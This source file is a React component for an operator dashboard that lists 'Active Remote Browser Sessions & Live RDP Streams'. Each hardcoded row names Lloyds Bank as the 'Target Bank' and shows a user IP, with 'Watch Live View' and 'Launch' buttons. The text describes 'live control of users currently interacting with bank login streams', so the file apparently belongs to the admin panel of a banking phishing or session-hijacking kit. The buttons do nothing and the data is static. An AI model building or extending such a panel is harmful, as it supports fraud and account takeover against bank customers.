"use client";

import { useState, useEffect } from "react";

export default function LiveStreamsTab() {
  const [sessions, setSessions] = useState([
    { sessionId: "sess_live_cmun6r", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
    { sessionId: "sess_live_cmun6i", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
    { sessionId: "sess_live_cmun6h", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
    { sessionId: "sess_live_cmun67", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
    { sessionId: "sess_live_cmun5s", bankName: "Lloyds Bank", ip: "39.34.173.81 (Unknown)", status: "Live RDP Active" },
  ]);

  return (
    <div className="space-y-6">
      <div className="bg-[#141418] border border-zinc-800 rounded-xl p-6 shadow-xl">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h3 className="text-sm font-bold text-zinc-100 flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-pulse"></span>
              Active Remote Browser Sessions & Live RDP Streams
            </h3>
            <p className="text-xs text-zinc-400 mt-1">
              Real-time overview and live control of users currently interacting with bank login streams.
            </p>
          </div>
          <button 
            onClick={() => window.location.reload()}
            className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-semibold transition cursor-pointer"
          >
            🔄 Refresh Stream Monitor
          </button>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead className="bg-zinc-900/80 text-zinc-400 uppercase tracking-wider border-b border-zinc-800">
              <tr>
                <th className="py-3 px-4">Session ID</th>
                <th className="py-3 px-4">Target Bank</th>
                <th className="py-3 px-4">User IP / Location</th>
                <th className="py-3 px-4">Stream Status</th>
                <th className="py-3 px-4 text-right">Admin Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800/60">
              {sessions.map((s, idx) => (
                <tr key={idx} className="hover:bg-zinc-900/40 transition">
                  <td className="py-3.5 px-4 font-mono text-zinc-300 font-medium">{s.sessionId}</td>
                  <td className="py-3.5 px-4 font-semibold text-zinc-200">{s.bankName}</td>
                  <td className="py-3.5 px-4 text-zinc-400">{s.ip}</td>
                  <td className="py-3.5 px-4">
                    <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
                      {s.status}
                    </span>
                  </td>
                  <td className="py-3.5 px-4 text-right space-x-2">
                    <button className="px-3 py-1 bg-sky-600/20 hover:bg-sky-600 text-sky-400 hover:text-white rounded text-[11px] font-medium border border-sky-500/30 transition cursor-pointer">
                      👁️ Watch Live View
                    </button>
                    <button className="px-3 py-1 bg-emerald-600/20 hover:bg-emerald-600 text-emerald-400 hover:text-white rounded text-[11px] font-medium border border-emerald-500/30 transition cursor-pointer">
                      🚀 Launch
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}